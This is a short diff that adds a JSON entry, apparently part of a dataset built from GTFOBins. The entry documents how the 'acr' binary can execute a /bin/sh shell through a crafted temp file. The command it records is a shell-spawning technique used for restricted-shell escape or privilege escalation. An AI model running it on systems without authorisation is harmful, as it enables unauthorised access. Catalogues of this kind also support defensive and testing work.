@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-acr-command",
+  "name": "GTFOBins · acr (command)",
+  "command": "echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nacr -r ./relative/path/to/temp-file",
+  "description": "Use acr to command via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "acr",
+    "command"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/acr/#command",
+  "upstream_id": "acr/command/0",
+  "category": "gtfobins",
+  "subcategory": "command",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/acr/"
+    }
+  ]
+}
